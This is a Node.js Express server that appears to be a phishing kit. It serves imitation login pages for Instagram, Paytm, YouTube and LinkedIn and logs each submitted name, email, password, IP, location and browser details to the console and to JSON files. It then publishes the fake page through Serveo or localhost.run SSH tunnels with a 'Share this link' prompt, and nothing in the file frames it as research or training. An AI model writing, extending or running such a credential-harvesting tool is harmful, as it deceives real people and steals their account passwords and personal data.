const express = require('express');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
const { exec, spawn } = require('child_process');

const app = express();
const PORT = 3000;

// Middleware
app.use(express.json());
app.use(express.static('.'));

// Create readline interface for user input
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Available login pages
const loginPages = {
    '1': { name: 'Instagram', file: 'insta.html', jsonFile: 'instagram_users.json' },
    '2': { name: 'Paytm', file: 'paytm.html', jsonFile: 'paytm_users.json' },
    '3': { name: 'YouTube', file: 'youtube.html', jsonFile: 'youtube_users.json' },
    '4': { name: 'LinkedIn', file: 'linkedin.html', jsonFile: 'linkedin_users.json' }
};

// Show menu
function showMenu() {
    console.log('\n' + '='.repeat(50));
    console.log('📱 MULTI-LOGIN PAGE SELECTOR');
    console.log('='.repeat(50));
    console.log('Select which login page to serve:');
    console.log('');

    for (const [key, page] of Object.entries(loginPages)) {
        console.log(`  ${key}. ${page.name} (${page.file})`);
    }

    console.log('');
    console.log('  0. Exit');
    console.log('='.repeat(50));
    console.log('');
}

// Function to start Serveo tunnel
function startServeo() {
    return new Promise((resolve) => {
        console.log('\n🌐 Creating public URL with Serveo.net...');
        console.log('📡 This uses SSH tunneling - no installation required!');
        
        // Check if SSH is available
        exec('which ssh', (error) => {
            if (error) {
                console.log('\n❌ SSH is not installed or not in PATH!');
                console.log('💡 On Windows, install Git Bash or WSL');
                console.log('💡 On Mac/Linux, SSH comes pre-installed');
                console.log('\n⚠️ Server running on localhost only');
                console.log(`📍 Local URL: http://localhost:${PORT}`);
                resolve(null);
                return;
            }

            console.log('🔄 Connecting to Serveo.net...');
            console.log('⏳ This may take a few seconds...\n');

            // Start Serveo tunnel
            const serveo = spawn('ssh', [
                '-R', `80:localhost:${PORT}`,
                'serveo.net'
            ], {
                stdio: 'pipe',
                shell: true
            });

            let publicUrl = null;
            let outputBuffer = '';

            serveo.stdout.on('data', (data) => {
                const output = data.toString();
                outputBuffer += output;
                console.log(output);
                
                // Look for the Serveo URL in output
                const urlMatch = output.match(/https?:\/\/[a-zA-Z0-9-]+\.serveo\.net/);
                if (urlMatch && !publicUrl) {
                    publicUrl = urlMatch[0];
                    console.log('\n🎉 PUBLIC URL READY!');
                    console.log('='.repeat(50));
                    console.log(`🌐 Share this link: ${publicUrl}`);
                    console.log('='.repeat(50));
                    console.log('\n💡 Keep this terminal open to maintain the connection');
                    console.log('⚠️ Close this terminal or press Ctrl+C to stop the server');
                    console.log('\n📊 All submissions will be saved locally');
                    resolve(publicUrl);
                }
                
                // Also try to find URL in error output (sometimes it appears there)
                const errUrlMatch = output.match(/https?:\/\/[a-zA-Z0-9-]+\.serveo\.net/);
                if (errUrlMatch && !publicUrl) {
                    publicUrl = errUrlMatch[0];
                    console.log('\n🎉 PUBLIC URL READY!');
                    console.log('='.repeat(50));
                    console.log(`🌐 Share this link: ${publicUrl}`);
                    console.log('='.repeat(50));
                    console.log('\n💡 Keep this terminal open to maintain the connection');
                    console.log('⚠️ Close this terminal or press Ctrl+C to stop the server');
                    console.log('\n📊 All submissions will be saved locally');
                    resolve(publicUrl);
                }
            });

            serveo.stderr.on('data', (data) => {
                const output = data.toString();
                outputBuffer += output;
                
                // Hide common SSH warnings but show important messages
                if (!output.includes('Warning: Permanently added') && 
                    !output.includes('connecting to serveo.net') &&
                    !output.includes('authenticity of host')) {
                    console.log(output);
                }
                
                // Look for URL in stderr as well
                const urlMatch = output.match(/https?:\/\/[a-zA-Z0-9-]+\.serveo\.net/);
                if (urlMatch && !publicUrl) {
                    publicUrl = urlMatch[0];
                    console.log('\n🎉 PUBLIC URL READY!');
                    console.log('='.repeat(50));
                    console.log(`🌐 Share this link: ${publicUrl}`);
                    console.log('='.repeat(50));
                    console.log('\n💡 Keep this terminal open to maintain the connection');
                    console.log('⚠️ Close this terminal or press Ctrl+C to stop the server');
                    console.log('\n📊 All submissions will be saved locally');
                    resolve(publicUrl);
                }
            });

            serveo.on('error', (err) => {
                console.error('❌ Serveo error:', err.message);
                console.log('\n💡 Alternative: Try using a different tunnel service');
                console.log('   ngrok http 3000');
                console.log('   or');
                console.log('   ssh -R 80:localhost:3000 localhost.run');
                resolve(null);
            });

            serveo.on('exit', (code) => {
                if (code !== 0 && !publicUrl) {
                    console.log('\n⚠️ Serveo tunnel closed');
                    console.log('💡 Try the following alternatives:');
                    console.log('   1. ngrok http 3000');
                    console.log('   2. ssh -R 80:localhost:3000 localhost.run');
                    console.log('   3. Use a VPS with Stairway');
                    resolve(null);
                }
            });

            // Timeout after 30 seconds if no URL found
            setTimeout(() => {
                if (!publicUrl) {
                    console.log('\n⏳ Still waiting for Serveo connection...');
                    console.log('💡 If this takes too long, try:');
                    console.log('   ssh -R 80:localhost:3000 serveo.net');
                    console.log('   in a separate terminal');
                    
                    // Check if we have any output at all
                    if (outputBuffer.length === 0) {
                        console.log('\n❌ No response from Serveo. Checking SSH connectivity...');
                        exec('ssh -V', (err, stdout, stderr) => {
                            if (err) {
                                console.log('❌ SSH not working properly. Please check your SSH installation.');
                            } else {
                                console.log('✅ SSH is installed. The issue might be with Serveo.net');
                                console.log('💡 Try the alternative: localhost.run');
                                console.log('   Command: ssh -R 80:localhost:3000 localhost.run');
                            }
                        });
                    }
                    resolve(null);
                }
            }, 30000);
        });
    });
}

// Function to start Localhost.run as fallback
function startLocalhostRun() {
    return new Promise((resolve) => {
        console.log('\n🌐 Trying Localhost.run as alternative...');
        
        const localhostRun = spawn('ssh', [
            '-R', `80:localhost:${PORT}`,
            'localhost.run'
        ], {
            stdio: 'pipe',
            shell: true
        });

        let publicUrl = null;

        localhostRun.stdout.on('data', (data) => {
            const output = data.toString();
            console.log(output);
            
            const urlMatch = output.match(/https?:\/\/[a-zA-Z0-9-]+\.localhost\.run/);
            if (urlMatch && !publicUrl) {
                publicUrl = urlMatch[0];
                console.log('\n🎉 PUBLIC URL READY!');
                console.log('='.repeat(50));
                console.log(`🌐 Share this link: ${publicUrl}`);
                console.log('='.repeat(50));
                console.log('\n💡 Keep this terminal open to maintain the connection');
                resolve(publicUrl);
            }
        });

        localhostRun.stderr.on('data', (data) => {
            const output = data.toString();
            const urlMatch = output.match(/https?:\/\/[a-zA-Z0-9-]+\.localhost\.run/);
            if (urlMatch && !publicUrl) {
                publicUrl = urlMatch[0];
                console.log('\n🎉 PUBLIC URL READY!');
                console.log('='.repeat(50));
                console.log(`🌐 Share this link: ${publicUrl}`);
                console.log('='.repeat(50));
                resolve(publicUrl);
            }
        });

        setTimeout(() => {
            if (!publicUrl) {
                console.log('⚠️ Localhost.run not responding');
                resolve(null);
            }
        }, 15000);
    });
}

// Dynamic route handler for each login page
function setupRoutes(selectedPage) {
    // Route to serve the selected HTML page
    app.get('/', (req, res) => {
        res.sendFile(path.join(__dirname, selectedPage.file));
    });

    // Route to save data to the specific JSON file
    app.post('/save-user', (req, res) => {
        const data = req.body;
        const filePath = path.join(__dirname, selectedPage.jsonFile);
        
        console.log(`\n📝 ${selectedPage.name} Login Data Received:`);
        console.log('─'.repeat(40));
        console.log(`  Name: ${data.name || 'N/A'}`);
        console.log(`  Email: ${data.email || 'N/A'}`);
        console.log(`  Password: ${data.password || 'N/A'}`);
        console.log(`  IP: ${data.ip || 'N/A'}`);
        console.log(`  Location: ${data.location || 'N/A'}`);
        console.log(`  Browser: ${data.browser || 'N/A'}`);
        console.log(`  OS: ${data.os || 'N/A'}`);
        console.log(`  Screen: ${data.screen || 'N/A'}`);
        console.log(`  Language: ${data.language || 'N/A'}`);
        console.log(`  Timezone: ${data.timezone || 'N/A'}`);
        console.log(`  Timestamp: ${data.timestamp || 'N/A'}`);
        console.log(`  Submitted: ${data.submitted_at || 'N/A'}`);
        console.log('─'.repeat(40));
        
        try {
            // Read existing data
            let existingData = [];
            if (fs.existsSync(filePath)) {
                const content = fs.readFileSync(filePath, 'utf8');
                if (content) {
                    existingData = JSON.parse(content);
                }
            }
            
            // Add new data
            existingData.push(data);
            
            // Write to file
            fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2));
            
            console.log(`✅ Data saved to ${selectedPage.jsonFile}`);
            console.log(`📊 Total entries: ${existingData.length}`);
            
            res.json({ 
                success: true, 
                message: `Data saved to ${selectedPage.jsonFile}`,
                count: existingData.length
            });
        } catch (error) {
            console.error('❌ Error saving data:', error);
            res.status(500).json({ 
                success: false, 
                error: 'Failed to save data' 
            });
        }
    });

    // Route to get all submissions
    app.get('/get-users', (req, res) => {
        const filePath = path.join(__dirname, selectedPage.jsonFile);
        
        try {
            if (fs.existsSync(filePath)) {
                const content = fs.readFileSync(filePath, 'utf8');
                const data = content ? JSON.parse(content) : [];
                res.json(data);
            } else {
                res.json([]);
            }
        } catch (error) {
            console.error('Error reading file:', error);
            res.status(500).json({ error: 'Failed to read file' });
        }
    });
}

// Function to start the server with selected page
async function startServer(selectedKey) {
    if (selectedKey === '0') {
        console.log('\n👋 Goodbye!');
        rl.close();
        process.exit(0);
    }

    const selectedPage = loginPages[selectedKey];
    
    if (!selectedPage) {
        console.log('\n❌ Invalid selection! Please try again.\n');
        askUser();
        return;
    }

    // Check if the HTML file exists
    if (!fs.existsSync(selectedPage.file)) {
        console.log(`\n⚠️ Warning: ${selectedPage.file} not found!`);
        console.log(`📝 Creating a template for ${selectedPage.name}...\n`);
    }

    console.log(`\n✅ Starting ${selectedPage.name} Login Page...`);
    console.log(`📁 Data will be saved to: ${selectedPage.jsonFile}`);
    console.log(`🌐 Local server running on: http://localhost:${PORT}`);
    console.log('\n' + '='.repeat(50));
    console.log('📝 Press Ctrl+C to stop the server');
    console.log('='.repeat(50) + '\n');

    // Setup routes for the selected page
    setupRoutes(selectedPage);

    // Start the Express server
    const server = app.listen(PORT, '0.0.0.0', async () => {
        console.log(`🚀 Local server is ready!`);
        console.log(`📍 Open: http://localhost:${PORT}`);
        console.log(`📊 Data file: ${selectedPage.jsonFile}`);
        console.log('\n🌐 Creating public URL...\n');
        
        // Try Serveo first
        let publicUrl = await startServeo();
        
        // If Serveo fails, try Localhost.run
        if (!publicUrl) {
            console.log('\n🔄 Serveo not available, trying Localhost.run...');
            publicUrl = await startLocalhostRun();
        }
        
        // If both fail, show instructions
        if (!publicUrl) {
            console.log('\n❌ Could not establish a public tunnel.');
            console.log('\n💡 Alternative methods to create a public URL:');
            console.log('='.repeat(50));
            console.log('1. Use ngrok (requires installation):');
            console.log('   npm install -g ngrok');
            console.log('   ngrok http 3000');
            console.log('');
            console.log('2. Use another SSH tunnel service:');
            console.log('   ssh -R 80:localhost:3000 localhost.run');
            console.log('   ssh -R 80:localhost:3000 tunnel.localhost.run');
            console.log('');
            console.log('3. If you have a VPS, use Stairway:');
            console.log('   stairway up 3000');
            console.log('='.repeat(50));
            console.log('\n⚠️ Server running on localhost only');
            console.log(`📍 Local URL: http://localhost:${PORT}`);
        }
    });

    // Handle server shutdown
    process.on('SIGINT', () => {
        console.log('\n\n🛑 Shutting down server...');
        // Kill any SSH processes (Serveo, Localhost.run)
        exec('pkill -f "ssh -R 80:localhost"', (err) => {
            if (err) console.log('⚠️ No tunnels to close');
        });
        server.close(() => {
            console.log('👋 Server stopped. Goodbye!');
            process.exit(0);
        });
    });
}

// Ask user for selection
function askUser() {
    showMenu();
    rl.question('Enter your choice (1-4, or 0 to exit): ', (answer) => {
        const choice = answer.trim();
        if (choice === '0' || choice === '1' || choice === '2' || choice === '3' || choice === '4') {
            startServer(choice);
        } else {
            console.log('\n❌ Invalid input! Please enter a number between 0 and 4.\n');
            askUser();
        }
    });
}

// Start the application
console.log('\n🌟 WELCOME TO MULTI-LOGIN PAGE SYSTEM');
console.log('📁 Files will be created as needed');
console.log('🌐 This will generate a temporary public URL using Serveo.net');
console.log('💡 No installation required - works with SSH!\n');
askUser();

// Export for testing
module.exports = { app, loginPages };